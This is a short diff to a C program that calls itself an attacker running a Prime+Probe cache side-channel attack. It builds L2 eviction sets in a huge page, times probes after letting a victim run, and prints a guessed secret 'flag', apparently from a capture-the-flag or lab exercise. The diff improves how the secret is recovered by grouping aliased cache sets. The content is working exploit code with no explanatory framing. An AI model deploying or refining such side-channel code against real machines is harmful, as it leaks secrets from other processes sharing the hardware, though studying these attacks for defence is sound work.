@@ -28,7 +28,6 @@ int main() {
 
     printf("Attacker ready. Prime+Probe starting...\n");
 
-    /* allocate 2MB huge page */
     buf = mmap(NULL,
                2*1024*1024,
                PROT_READ | PROT_WRITE,
@@ -41,10 +40,8 @@ int main() {
         exit(1);
     }
 
-    /* touch page */
     *((char*)buf) = 1;
 
-    /* build eviction sets */
     for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
         for(int w = 0; w < WAYS; w++) {
             eviction_sets[set][w] = buf + set*LINE_SIZE + w*STRIDE;
@@ -66,7 +63,6 @@ int main() {
                 }
             }
 
-            /* allow victim to execute */
             usleep(500);
 
             /* PROBE */
@@ -84,21 +80,40 @@ int main() {
             }
         }
 
-        /* find highest latency set */
-        int best_set = 0;
-        uint64_t max_score = 0;
+        /* Combine alias groups */
+        int best_group = 0;
+        uint64_t best_score = 0;
 
-        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+        for(int base = 0; base < 256; base++) {
 
-            uint64_t avg = scores[set] / REPEATS;
+            uint64_t group_score =
+                scores[base] +
+                scores[base + 256] +
+                scores[base + 512] +
+                scores[base + 768];
 
-            if(avg > max_score) {
-                max_score = avg;
-                best_set = set;
+            if(group_score > best_score) {
+                best_score = group_score;
+                best_group = base;
             }
         }
 
-        printf("Guessed flag: %d (latency=%lu)\n", best_set, max_score);
+        /* find best set within group */
+        int best_set = best_group;
+        uint64_t best_latency = 0;
+
+        for(int i = 0; i < 4; i++) {
+
+            int s = best_group + i*256;
+            uint64_t avg = scores[s] / REPEATS;
+
+            if(avg > best_latency) {
+                best_latency = avg;
+                best_set = s;
+            }
+        }
+
+        printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);
 
         usleep(500000);
     }
